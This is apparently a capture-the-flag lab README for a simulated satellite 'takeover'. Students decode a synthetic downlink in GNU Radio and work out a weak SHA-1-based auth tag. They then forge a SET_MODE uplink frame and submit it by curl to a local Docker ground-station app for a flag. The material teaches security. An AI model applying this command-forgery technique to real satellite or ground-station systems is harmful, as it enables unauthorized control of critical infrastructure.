![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Lab 3 — The Takeover


**Scenario:** You’ve successfully intercepted ODYSSEY-1’s downlink. Inside the captured traffic, you spotted telemetry and even an ACK packet that contains a mysterious `auth` field

Your task is to **reverse engineer the uplink authentication scheme, craft a forged control command, and trick the ground station into accepting it**

## Setup ( Only if you are not using the VM )
Download the zip for this main folder from [Here](./Lab3.zip)

- Click the Download button

<img width="330" height="177" alt="image" src="https://github.com/user-attachments/assets/df15f9ee-985a-4f6a-af65-32698e1aa337" />

- Extract it

## Provided
- ``assets/takeover_pass.iq`` — synthetic downlink (48 kS/s cf32)
- ``groundstation/`` — control app (verifies your forged uplink)
- ``tools/craft_uplink_template.py`` — OPTIONAL helper

Protocol recap (from Lab 1):
- SYNC=0x1ACFFC1D
- Frame: [SYNC(4)][VER(1)][SEQ(2)][TYPE(1)][LEN(2)][PAY(JSON)][CRC16(2)]
- CRC16-CCITT over [VER..PAY]

Auth rule (discover/confirm from pass): auth = sha1(str(epoch) + sat + "-BLUE")[:8]


Check your tools:
```bash
gnuradio-companion --version
python3 --version
docker --version
docker compose version
```


---

# Start
## Part A — Decode the Downlink

1. **Open GNU Radio Companion (GRC)** and take the flow from [Lab 1](../Lab1/TheIntercepterLab.md) or build this flow:
   ```
   File Source (Complex, 48k, Repeat=Yes, file=assets/takeover_pass.iq)
     → Throttle (48k)
     → Quadrature Demod (gain ≈ 3.82)
     → (optional LPF)
     → Clock Recovery (omega=40.0, gain_mu ≈ 0.17)
     → Binary Slicer
     → File Sink (takeover.bits)
   ```

2. Run it. This will output raw bits into `takeover.bits`.

3. **Parse the frames** (reuse the Lab 1 parser).
   - Extract JSON payloads
   - Find the telemetry packet with `epoch` and `sat`
   - Find the ACK packet containing `auth=xxxxxxx` (this is your clue)

Just replace the ``File Source`` block and the `File Sink` blocks with our new `assets/takeover_pass.iq` and run it

<img width="1474" height="703" alt="image" src="https://github.com/user-attachments/assets/51e9f712-8175-4018-970d-79851915a7d6" />

4. The **assets** folder should now look like this

<img width="725" height="51" alt="image" src="https://github.com/user-attachments/assets/132fc0ec-9ee1-453d-b5d0-ce09b9d8e90a" />

5. View `takeover_pass_BPF.txt`

```bash
xxd -g1 takeover_pass_BPF.txt
```

<img width="793" height="1019" alt="image" src="https://github.com/user-attachments/assets/82d07b1b-57d5-4981-80a0-b71c6f68362a" />

6. **Work out the auth rule**:  
   The hint in telemetry says:  
   ```
   auth = sha1(str(epoch) + sat + "-BLUE")[:8]
   ```

---

## Part B — Forge the Uplink

1. Build a **TYPE=3** packet with this payload:
   ```json
   {
     "cmd": "SET_MODE",
     "mode": "CAL",
     "epoch": <epoch you found>,
     "sat": "ODYSSEY-1",
     "auth": "<sha1-derived>"
   }
   ```

2. Frame layout (same as Lab 1):  
   ```
   [SYNC(4)][VER(1)][SEQ(2)][TYPE(1)][LEN(2)][PAYLOAD(JSON)][CRC16(2)]
   ```
   - SYNC = `0x1ACFFC1D`
   - CRC = CRC16-CCITT over `[VER..PAYLOAD]` (exclude SYNC)

3. Use the provided helper script:  
   ```bash
   python3 tools/craft_uplink_template.py
   # -> creates uplink.bin
   ```

4. Inspect your binary:  
   ```bash
   xxd -g1 uplink.bin
   ```
<img width="690" height="169" alt="image" src="https://github.com/user-attachments/assets/92b9ed26-2a29-4ccb-8aab-ab0cce766a0c" />

### If you want to learn and build the payload from scratch, go [here](./Build_Payload_From_Scratch.md)

---

## Part C — Send It

1. Start the control app:  
   ```bash
   cd groundstation
   sudo docker compose up --build
   # Visit http://localhost:5000 in your browser
   ```

2. Submit your packet:  
   - **Binary upload:**
     ```bash
     curl -F "packet=@uplink.bin" http://localhost:5000/uplink | jq .
     ```
   - **Hex JSON:**
     ```bash
     HEX=$(xxd -p uplink.bin | tr -d '\n')
     curl -H "Content-Type: application/json" -d "{\"hex\":\"$HEX\"}" http://localhost:5000/uplink | jq .
     ```

<img width="1042" height="187" alt="image" src="https://github.com/user-attachments/assets/97b4cb14-251c-4fe6-95d4-390de0ba29bf" />


3. If correct you’ll see:  
   ```json
   {
     "ok": true,
     "ack": "SET_MODE CAL accepted",
     "flag": "FLAG_TAKEOVER{mode_set_CAL}"
   }
   ```

4. Check the dashboard (`/` endpoint) — it should now display your new mode and auth tag

---

## Troubleshooting
- **bad sync / bad crc** → CRC should exclude SYNC, cover `[VER..PAYLOAD]`
- **wrong type** → `ptype` must be `0x03`
- **bad auth** → recompute SHA‑1 using telemetry `epoch` + `sat` + `"-BLUE"`
- **no response** → ensure Docker container is running and `http://localhost:5000` is reachable

---

## Safety Note
This is a **training simulation**. Never attempt to attack real satellites or ground stations
